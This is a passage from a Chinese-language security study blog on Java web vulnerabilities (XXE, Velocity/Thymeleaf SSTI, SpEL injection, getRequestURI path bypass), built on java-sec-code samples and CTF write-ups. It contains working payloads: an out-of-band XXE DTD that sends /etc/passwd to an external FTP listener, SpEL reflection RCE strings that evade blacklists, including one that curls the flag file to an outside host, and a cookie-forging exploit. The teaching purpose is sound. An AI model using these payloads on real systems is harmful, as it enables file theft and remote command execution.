DefaultHandler()); // parse xml return \"SAXParser xxe vuln code\"; &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; &#125; @RequestMapping(value = \"/SAXParser/sec\", method = RequestMethod.POST) public String SAXParserSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXParserFactory spf = SAXParserFactory.newInstance(); spf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); spf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); spf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); SAXParser parser = spf.newSAXParser(); parser.parse(new InputSource(new StringReader(body)), new DefaultHandler()); // parse xml &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"SAXParser xxe security code\"; &#125; @RequestMapping(value = \"/Digester/vuln\", method = RequestMethod.POST) public String DigesterVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); Digester digester = new Digester(); digester.parse(new StringReader(body)); // parse xml &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"Digester xxe vuln code\"; &#125; @RequestMapping(value = \"/Digester/sec\", method = RequestMethod.POST) public String DigesterSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); Digester digester = new Digester(); digester.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); digester.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); digester.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); digester.parse(new StringReader(body)); // parse xml return \"Digester xxe security code\"; &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; &#125; // 有回显 @RequestMapping(value = \"/DocumentBuilder/vuln01\", method = RequestMethod.POST) public String DocumentBuilderVuln01(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); Document document = db.parse(is); // parse xml // 遍历xml节点name和value StringBuilder buf = new StringBuilder(); NodeList rootNodeList = document.getChildNodes(); for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123; Node rootNode = rootNodeList.item(i); NodeList child = rootNode.getChildNodes(); for (int j = 0; j &lt; child.getLength(); j++) &#123; Node node = child.item(j); buf.append(String.format(\"%s: %s\\n\", node.getNodeName(), node.getTextContent())); &#125; &#125; sr.close(); return buf.toString(); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; &#125; // 有回显 @RequestMapping(value = \"/DocumentBuilder/vuln02\", method = RequestMethod.POST) public String DocumentBuilderVuln02(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); Document document = db.parse(is); // parse xml // 遍历xml节点name和value StringBuilder result = new StringBuilder(); NodeList rootNodeList = document.getChildNodes(); for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123; Node rootNode = rootNodeList.item(i); NodeList child = rootNode.getChildNodes(); for (int j = 0; j &lt; child.getLength(); j++) &#123; Node node = child.item(j); // 正常解析XML，需要判断是否是ELEMENT_NODE类型。否则会出现多余的的节点。 if (child.item(j).getNodeType() == Node.ELEMENT_NODE) &#123; result.append(String.format(\"%s: %s\\n\", node.getNodeName(), node.getFirstChild())); &#125; &#125; &#125; sr.close(); return result.toString(); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; &#125; @RequestMapping(value = \"/DocumentBuilder/Sec\", method = RequestMethod.POST) public String DocumentBuilderSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); db.parse(is); // parse xml sr.close(); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"DocumentBuilder xxe security code\"; &#125; @RequestMapping(value = \"/DocumentBuilder/xinclude/vuln\", method = RequestMethod.POST) public String DocumentBuilderXincludeVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setXIncludeAware(true); // 支持XInclude dbf.setNamespaceAware(true); // 支持XInclude DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); Document document = db.parse(is); // parse xml NodeList rootNodeList = document.getChildNodes(); response(rootNodeList); sr.close(); return \"DocumentBuilder xinclude xxe vuln code\"; &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; &#125; @RequestMapping(value = \"/DocumentBuilder/xinclude/sec\", method = RequestMethod.POST) public String DocumentBuilderXincludeSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setXIncludeAware(true); // 支持XInclude dbf.setNamespaceAware(true); // 支持XInclude dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); Document document = db.parse(is); // parse xml NodeList rootNodeList = document.getChildNodes(); response(rootNodeList); sr.close(); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"DocumentBuilder xinclude xxe vuln code\"; &#125; @PostMapping(\"/XMLReader/vuln\") public String XMLReaderVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXParserFactory spf = SAXParserFactory.newInstance(); SAXParser saxParser = spf.newSAXParser(); XMLReader xmlReader = saxParser.getXMLReader(); xmlReader.parse(new InputSource(new StringReader(body))); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"XMLReader xxe vuln code\"; &#125; @PostMapping(\"/XMLReader/sec\") public String XMLReaderSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXParserFactory spf = SAXParserFactory.newInstance(); SAXParser saxParser = spf.newSAXParser(); XMLReader xmlReader = saxParser.getXMLReader(); xmlReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); xmlReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); xmlReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); xmlReader.parse(new InputSource(new StringReader(body))); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"XMLReader xxe security code\"; &#125; /** * 修复该漏洞只需升级dom4j到2.1.1及以上，该版本及以上禁用了ENTITY； * 不带ENTITY的PoC不能利用，所以禁用ENTITY即可完成修复。 */ @PostMapping(\"/DocumentHelper/vuln\") public String DocumentHelper(HttpServletRequest req) &#123; try &#123; String body = WebUtils.getRequestBody(req); DocumentHelper.parseText(body); // parse xml &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"DocumentHelper xxe vuln code\"; &#125; private static void response(NodeList rootNodeList)&#123; for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123; Node rootNode = rootNodeList.item(i); NodeList xxe = rootNode.getChildNodes(); for (int j = 0; j &lt; xxe.getLength(); j++) &#123; Node xxeNode = xxe.item(j); // 测试不能blind xxe，所以强行加了一个回显 logger.info(\"xxeNode: \" + xxeNode.getNodeValue()); &#125; &#125; &#125; public static void main(String[] args) &#123; &#125;&#125; 从上面的代码可以看出。可导致XXE的xml解析类有许多种。同时进行防范时大多是使用了setFeature()来把某个特性设置为true/false. 简单的内容同样不谈。这里关于javaxxe的几个特性稍微研究一下。先找个能回显的路由/DocumentBuilder/vuln01 java的xxe可列目录。 file协议,netdoc协议均可 file:/ , netdoc:/就能列根目录了。这点在某些写过滤大意的情况下可能会有帮助，比如只过滤了file://的情况。 这点曾经在某个比赛中遇到过。当时题目后端使用的是php。但是它有一个将xml节点渲染成图片并回显的功能。像这种功能的底部实现很有可能是java达成的。因此在不知道路径文件名读取源码时可以通过列目录解决问题。 java的xxe不能读取多行的问题 这个相比较php而言算是比较大的问题。php的伪协议为其读取方式带来了很大的便利,并且几乎是万金油。但是java的xxe有时读取不到多行完全是取决于jdk的版本并且普遍存在读取不了&lt; %的问题。 通常我们在盲打java oob xxe时普遍选择ftp协议(其实是因为支持的可外连的协议只有http/s ftp)。http只能读取单行文件。ftp则在不同版本下有不同表现 这里其他大佬普遍针对这个问题进行了研究https://landgrey.me/blog/9/https://www.leadroyal.cn/?p=914结论是: 使用ftp 进行 oob 时，对版本有限制， &lt;7u141 和 &lt;8u162 才可以读取整个文件,全版本 http 都只可以读单行文件 总之遇到问题先打上一发看看。这里放出ftpserver的ruby代码。因为vps端口问题我把端口改了 12345678910111213141516171819require 'socket'server = TCPServer.new 8001loop do Thread.start(server.accept) do |client| puts \"New client connected\" data = \"\" client.puts(\"220 xxe-ftp-server\") loop &#123; req = client.gets() puts \"&lt; \"+req if req.include? \"USER\" client.puts(\"331 password please - version check\") else #puts \"&gt; 230 more data please!\" client.puts(\"230 more data please!\") end &#125; endend payload 123&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM \"http://xxxx/evil.dtd\"&gt;%remote;]&gt;&lt;root/&gt; evil.dtd 1234&lt;!ENTITY % payload SYSTEM \"file:///etc/passwd\"&gt;&lt;!ENTITY % int \"&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://fakeuser:fakepass@xxxxxxxx:8001/%payload;'&gt;\"&gt;%int;%trick 当然以上针对的是OOB.也就是盲打外带的方法 Xinclude xxe 这点我倒是非常感兴趣。因为前不久的htb Quick这台靶机就用到了xinclude+xslt的RCE(没错,其实是引入通过外部xml达成RCE) 当然不是所有服务都能像Esigate那样有这么低级的错误。正常来说我们一般是可以尝试xxe读文件 1234&lt;?xml version=\"1.0\" ?&gt;&lt;root xmlns:xi=\"http://www.w3.org/2001/XInclude\"&gt; &lt;xi:include href=\"file:///etc/passwd\" parse=\"text\"/&gt;&lt;/root&gt; 对于php而言。不需要打开外部实体引用选项，也能使用xinclude读取本地文件。 这里顺便分享下htb 那里参考的文章。我认为其利用对于提升xxe作用这点是很有参考价值的。https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/ 总而言之,java进行xxe相比常见的php后端而言多了许多限制。但是可以列目录这点是关键。同时遇到要盲打时，ftp是最好的选择。防御上,使用setFeature就能让外部实体不被加载。 sstiJava的ssti相比较jinja等等而言还是很好理解的。只是对于不同框架应对手段不同 123456789101112131415161718192021222324252627282930313233343536373839package org.joychou.controller;import org.apache.velocity.VelocityContext;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import org.apache.velocity.app.Velocity;import java.io.StringWriter;@RestController@RequestMapping(\"/ssti\")public class SSTI &#123; /** * SSTI of Java velocity. The latest Velocity version still has this problem. * Fix method: Avoid to use Velocity.evaluate method. * &lt;p&gt; * http://localhost:8080/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open%20-a%20Calculator%22) * Open a calculator in MacOS. * * @param template exp */ @GetMapping(\"/velocity\") public void velocity(String template) &#123; Velocity.init(); VelocityContext context = new VelocityContext(); context.put(\"author\", \"Elliot A.\"); context.put(\"address\", \"217 E Broadway\"); context.put(\"phone\", \"555-1337\"); StringWriter swOut = new StringWriter(); Velocity.evaluate(context, swOut, \"test\", template); &#125;&#125; 此处是一个Velocity的ssti。payload是#set($e=&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;curl xxxx&quot;) 可以看出渲染的语句是#开头后接一个反射构造的命令执行payload.$e为字符串。因此后面就是从java.lang.String对象开始获取类，方法，执行命令。 这点上从某种角度与SpEL非常相似。当然后面做SpEL注入时再细讲。这里分享一个之前在SharkyCTF中遇到的Thymeleaf ssti。因为当时题目后端把各种命令执行都hook了,自己一直没能成功执行命令,虽然实际上不需要命令执行就能做,但是查资料的过程中也有了新的收获。 https://ctftime.org/task/11563 这题因为使用了Thymeleaf.加上我在使用[[${7*7}]]时返回了49。所以我认为是使用了Thymeleaf来进行渲染的。(Thymeleaf是通过两个中括号取值的)可惜题目底层hook的非常严,没能RCE。读文件的payload[[${ new java.io.BufferReader(new java.io.FileReader(&quot;/etc/passwd&quot;)).readLine()}]]都做不到。比赛结束后才发现要猜flag这个class的存在的,比较无语。但是从中我们也可以看出,java ssti其实就是判断出对应引擎后用接近于SpEL的思路来进行利用。否则就是利用题目环境中的class读取变量. 比赛中当时参考了这篇文章https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/其实仔细想想怎么看都是SpEL的意思……所以相关技巧还是留到下一篇SpEL讲吧。 SpELvuln code 12345678910111213141516171819202122232425262728293031323334353637package org.joychou.controller;import org.springframework.expression.ExpressionParser;import org.springframework.expression.spel.standard.SpelExpressionParser;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;/** * SpEL Injection * * @author JoyChou @2019-01-17 */@RestControllerpublic class SpEL &#123; /** * SPEL to RCE * http://localhost:8080/spel/vul/?expression=xxx. * xxx is urlencode(exp) * exp: T(java.lang.Runtime).getRuntime().exec(\"curl xxx.ceye.io\") */ @GetMapping(\"/spel/vuln\") public String rce(String expression) &#123; ExpressionParser parser = new SpelExpressionParser(); // fix method: SimpleEvaluationContext return parser.parseExpression(expression).getValue().toString(); &#125; public static void main(String[] args) &#123; ExpressionParser parser = new SpelExpressionParser(); String expression = \"T(java.lang.Runtime).getRuntime().exec(\\\"open -a Calculator\\\")\"; String result = parser.parseExpression(expression).getValue().toString(); System.out.println(result); &#125;&#125; 首先,SpEL表达式注入漏洞 是EL(expression language)的一种。之所以叫SpEL是因为它是应用在Spring框架中的。不过只要掌握了SpEL的相关知识，想必其他的表达式注入漏洞也能收手到擒来吧。 SpEL有许多特性： 使用Bean的ID来引用Bean 可调用方法和访问对象的属性 可对值进行算数、关系和逻辑运算 可使用正则表达式进行匹配 可进行集合操作 因此我认为上面一类java的ssti利用本质上还是在定界符中进行了表达式运算,所以了解表达式注入也就成为了重中之重。 首先是语法知识 SpEL支持的定界符 #{} 引用其他对象:#{car}引用其他对象的属性：#{car.brand}调用其它方法 , 还可以链式操作：#{car.toString()} 属性名称还可以使用${xxxx}此外还有一种使用T运算符,调用类作用域方法和常量#{T(java.lang.Math)}返回一个java.lang.Math对象 一般来说我们会把SpEL用在xml配置或者注解的使用中，这应该是是为了其动态性。除此之外就是直接用在代码块中进行expression. 导致SpEL注入的原因如下: SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext：SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。 在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。 此处javasec的SpEL命令执行理论上只要使用 1T(java.lang.Runtime).getRuntime().exec(\"curl xxx\") 即可。不过这里执行时总是不成功，有点迷。但是没有关系，毕竟无论比赛还是实战都不可能碰上没有waf的SpEL。这里干脆直接找其他的几个例子来试试(其实懒得本地建个maven项目了，我自己爬) code-breaking javacon 年初的题一直留到现在…就是为了学SpEL的这一天。 题目的源码jar下好后。老样子扔进lib里直接审计结构:在配置application.xml中有这样的黑名单 1234567891011121314spring: thymeleaf: encoding: UTF-8 cache: false mode: HTMLkeywords: blacklist: - java.+lang - Runtime - exec.*\\(user: username: admin password: admin rememberMeKey: c0dehack1nghere1 显然是限制了Runtime.exec的命令执行。但是实际上这个waf真的非常友好了… 再来看主体源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106package io.tricking.challenge;import io.tricking.challenge.spel.SmallEvaluationContext;import java.util.regex.Matcher;import java.util.regex.Pattern;import javax.servlet.http.Cookie;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.expression.Expression;import org.springframework.expression.ExpressionParser;import org.springframework.expression.ParserContext;import org.springframework.expression.common.TemplateParserContext;import org.springframework.expression.spel.standard.SpelExpressionParser;import org.springframework.http.HttpStatus;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.CookieValue;import org.springframework.web.bind.annotation.ExceptionHandler;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.ResponseStatus;import org.springframework.web.client.HttpClientErrorException;@Controllerpublic class MainController &#123; ExpressionParser parser = new SpelExpressionParser(); @Autowired private KeyworkProperties keyworkProperties; @Autowired private UserConfig userConfig; public MainController() &#123; &#125; @GetMapping public String admin(@CookieValue(value = \"remember-me\",required = false) String rememberMeValue, HttpSession session, Model model) &#123; if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals(\"\")) &#123; String username = this.userConfig.decryptRememberMe(rememberMeValue); if (username != null) &#123; session.setAttribute(\"username\", username); &#125; &#125; Object username = session.getAttribute(\"username\"); if (username != null &amp;&amp; !username.toString().equals(\"\")) &#123; model.addAttribute(\"name\", this.getAdvanceValue(username.toString())); return \"hello\"; &#125; else &#123; return \"redirect:/login\"; &#125; &#125; @GetMapping(&#123;\"/login\"&#125;) public String login() &#123; return \"login\"; &#125; @GetMapping(&#123;\"/login-error\"&#125;) public String loginError(Model model) &#123; model.addAttribute(\"loginError\", true); model.addAttribute(\"errorMsg\", \"登陆失败，用户名或者密码错误！\"); return \"login\"; &#125; @PostMapping(&#123;\"/login\"&#125;) public String login(@RequestParam(value = \"username\",required = true) String username, @RequestParam(value = \"password\",required = true) String password, @RequestParam(value = \"remember-me\",required = false) String isRemember, HttpSession session, HttpServletResponse response) &#123; if (this.userConfig.getUsername().contentEquals(username) &amp;&amp; this.userConfig.getPassword().contentEquals(password)) &#123; session.setAttribute(\"username\", username); if (isRemember != null &amp;&amp; !isRemember.equals(\"\")) &#123; Cookie c = new Cookie(\"remember-me\", this.userConfig.encryptRememberMe()); c.setMaxAge(2592000); response.addCookie(c); &#125; return \"redirect:/\"; &#125; else &#123; return \"redirect:/login-error\"; &#125; &#125; @ExceptionHandler(&#123;HttpClientErrorException.class&#125;) @ResponseStatus(HttpStatus.FORBIDDEN) public String handleForbiddenException() &#123; return \"forbidden\"; &#125; private String getAdvanceValue(String val) &#123; String[] var2 = this.keyworkProperties.getBlacklist(); int var3 = var2.length; for(int var4 = 0; var4 &lt; var3; ++var4) &#123; String keyword = var2[var4]; Matcher matcher = Pattern.compile(keyword, 34).matcher(val); if (matcher.find()) &#123; throw new HttpClientErrorException(HttpStatus.FORBIDDEN); &#125; &#125; ParserContext parserContext = new TemplateParserContext(); Expression exp = this.parser.parseExpression(val, parserContext); SmallEvaluationContext evaluationContext = new SmallEvaluationContext(); return exp.getValue(evaluationContext).toString(); &#125;&#125; 流程非常简单。getAdvanceValue是一个解密+检查黑名单+调用spel的方法。而我们在登录后程序会从rememberme的cookie处对表达式进行计算。 注意到加密方式源码 1234public String encryptRememberMe() &#123; String encryptd = Encryptor.encrypt(this.rememberMeKey, \"0123456789abcdef\", this.username); return encryptd; &#125; rememberMeKey我们是知道的,所以就可以生成对应的cookiepayload了。 1#&#123;T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"ex\\\"+\\\"ec\\\",T(String[])).invoke(T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"getRu\\\"+\\\"ntime\\\").invoke(T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\")),new String[]&#123;\\\"/bin/bash\\\",\\\"-c\\\",\\\"curl xxxx\\\"&#125;)&#125; 这里使用的方法是通过字符串拼接来绕过关键字过滤的问题。并且本质上还是使用的反射作为基础payload.生成cookie的代码 123456public class spel &#123; public static void main(String[] args) &#123; System.out.println(Encryptor.encrypt(\"c0dehack1nghere1\", \"0123456789abcdef\", \"#&#123;T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"ex\\\"+\\\"ec\\\",T(String[])).invoke(T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"getRu\\\"+\\\"ntime\\\").invoke(T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\")),new String[]&#123;\\\"/bin/bash\\\",\\\"-c\\\",\\\"curl xxxxx/`cat /fla*`\\\"&#125;)&#125;\")); &#125;&#125; 收下flag. 由于还有很多CVE也是SpEL相关，所以我们可以利用相似的思路构造payload.比如用javascript引擎跟ProcessBuilder 12345//反射 ScriptEngineManager类。获取eval.#&#123;T(String).getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.la\"+\"ng.Run\"+\"time.getRun\"+\"time().ex\"+\"ec('calc.exe')\")&#125;//反射 ProcessBuilder,进行命令执行#&#123;(T(String).getClass().forName(\"java.la\"+\"ng.ProcessBuilder\").getConstructor('foo'.split('').getClass()).newInstance(new String[]&#123;'calc.exe'&#125;)).start()&#125; 然后就是之前见过的用到数组绕过的方法构造的Nuxeo rce的payload。用于byoass getclass 1#&#123;''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'calc.exe')&#125; 不过这个payload好像测试时就没成功过。 然后还有一种bypass引号的方法 1$&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())&#125; 即利用T运算符获取到Charactor再用toString来得到字符。 De1CTF calc 上面的都是命令执行payload。然而实际上如果遇到De1这道题，openrasp把底层的命令执行都hook的情况,就只能从别的思路下手了。(虽然dalao还是RCE了,太强了)题目的过滤大致如下 1234567ProcessBuilderjava.langgetClassRuntimenewT(# 先是这层过滤,然后才是openrasp的保护。 这道题首先如果利用spel不区分关键字大小写的特性,可以直接忽视new被过滤的情况读文件 1New java.io.BufferedReader(New java.io.FileReader(\"/flag\")).readLine() 不过师傅对于这些关键字的绕过也有其他的办法https://landgrey.me/blog/15/ 比如前面的getClass(),除了用数组绕过,还可以用&#39;&#39;.class.getSuperclass().class获取到 除此以外，还FUZZ出了T%00(可以绕过T(的waf的手段。(这是底层源码的问题,膜) 至于dalao达成RCE的思路,我觉得也非常值得学习。因为我们想要读文件或者执行命令的话,必然是要创建一个实例的。而SpEL提供了T()用来指定一个实例,这是一种思路。除此以外就是使用java代码来实例化。除了new以外,像反序列化这种方式也是可以创建实例的。所以使用T(org.springframework.util.SerializationUtils).deserialize(T(com.sun.org.apache.xml.internal.security.utils.Base64).decode(&#39;rO0AB...&#39;))这种静态方法完全可以。除此之外就是要把恶意代码写在默认的类构造器中，就不需要显示的实例化类，也能执行代码了。 如果以后遇到对应的问题一定会去仔细研究下。 url security issues今天来就几个url的问题稍微研究下。 GetRequestURI GetRequestURI.java 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package org.joychou.controller;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.util.AntPathMatcher;import org.springframework.util.PathMatcher;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import javax.servlet.http.HttpServletRequest;/** * The difference between getRequestURI and getServletPath. * 由于Spring Security的&lt;code&gt;antMatchers(\"/css/**\", \"/js/**\")&lt;/code&gt;未使用getRequestURI，所以登录不会被绕过。 * &lt;p&gt; * Details: https://joychou.org/web/security-of-getRequestURI.html * &lt;p&gt; * Poc: * http://localhost:8080/css/%2e%2e/exclued/vuln * http://localhost:8080/css/..;/exclued/vuln * http://localhost:8080/css/..;bypasswaf/exclued/vuln * * @author JoyChou @2020-03-28 */@RestController@RequestMapping(\"uri\")public class GetRequestURI &#123; private final Logger logger = LoggerFactory.getLogger(this.getClass()); @GetMapping(value = \"/exclued/vuln\") public String exclued(HttpServletRequest request) &#123; String[] excluedPath = &#123;\"/css/**\", \"/js/**\"&#125;; String uri = request.getRequestURI(); // Security: request.getServletPath() PathMatcher matcher = new AntPathMatcher(); logger.info(\"getRequestURI: \" + uri); logger.info(\"getServletPath: \" + request.getServletPath()); for (String path : excluedPath) &#123; if (matcher.match(path, uri)) &#123; return \"You have bypassed the login page.\"; &#125; &#125; return \"This is a login page &gt;..&lt;\"; &#125;&#125; geteRequestURI实际上是HttpServletRequest中几个解析URL的函数中的一种。它会返回除去Host（域名或IP）部分的路径。这里我们本地来起个项目跑一下。按照Mi1k7ea博客中的jsp替换index.jsp (https://xz.aliyun.com/t/7544) 1234567&lt;% out.println(\"getRequestURL(): \" + request.getRequestURL() + \"&lt;br&gt;\"); out.println(\"getRequestURI(): \" + request.getRequestURI() + \"&lt;br&gt;\"); out.println(\"getContextPath(): \" + request.getContextPath() + \"&lt;br&gt;\"); out.println(\"getServletPath(): \" + request.getServletPath() + \"&lt;br&gt;\"); out.println(\"getPathInfo(): \" + request.getPathInfo() + \"&lt;br&gt;\");%&gt; 起一个tomcat的话,要在Run=&gt;EditConfiguration 左边+号添加一个local tomcat server。并将项目路径配置好。我这里配置的根目录是java_sec_web. 接着来实验。一下几种形式的访问都可以访问到index.jsp 123http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;index.jsphttp:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;index.jsphttp:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;totally_not_matter&#x2F;..&#x2F;index.jsp 特别的,使用;a/;bb/;ccc/index.jsp也可以访问到。 从这里我们就能发现。使用getRequestURI似乎就是直接返回我们请求路径host后面的部分。实际上底层源码也确实是这么写的。既然如此就可以导致某些利用urlbypass的攻击。 比如说,/java_sec_web/info路径下存在一个secret.jsp它通过如下代码来限制没有权限的人访问 12345678 HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;HttpServletResponse httpServletResponse =(HttpServletResponse)servletResponse;String url = httpServletRequest.getRequestURI();if (url.startsWith(\"/urltest/info\")) &#123; httpServletResponse.getWriter().write(\"No Permission.\"); return;&#125; 但是如下路径则可以轻松bypass 123http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;.&#x2F;info&#x2F;secret.jsphttp:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;;233333&#x2F;info&#x2F;secret.jsphttp:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;32112323&#x2F;..&#x2F;info&#x2F;secret.jsp 回到项目上来。我们就可以用同样的道理进行权限绕过了。这里给出的path是css与js这样的静态目录。String[] excluedPath = {&quot;/css/**&quot;, &quot;/js/**&quot;};我们同样可以通过几种方式访问。 所以安全的解决方案通常是使用getPathInfo()或者getServletPath()来替换getRequestURI() 今年的一个shiroCVE就是这个成因。因为拦截器写的时候拦截了/abc/*这样的正则。而使用/abc/1/时，shiro的拦截器没有拦截到。但是getRequestURI却让我们正常访问到了。导致了权限绕过。 url解析 跟学习ssrf时里面出现的bypass url host限制是一个类型。因为有现成的解释就不多作说明了https://github.com/JoyChou93/java-sec-code/wiki/URL-whtielist-Bypass 基本上还是通过#,;等等来进行urlbypass绕过gethost。 302调转 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293package org.joychou.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.ResponseBody;import javax.servlet.RequestDispatcher;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import org.joychou.security.SecurityUtil;/** * The vulnerability code and security code of Java url redirect. * The security code is checking whitelist of url redirect. 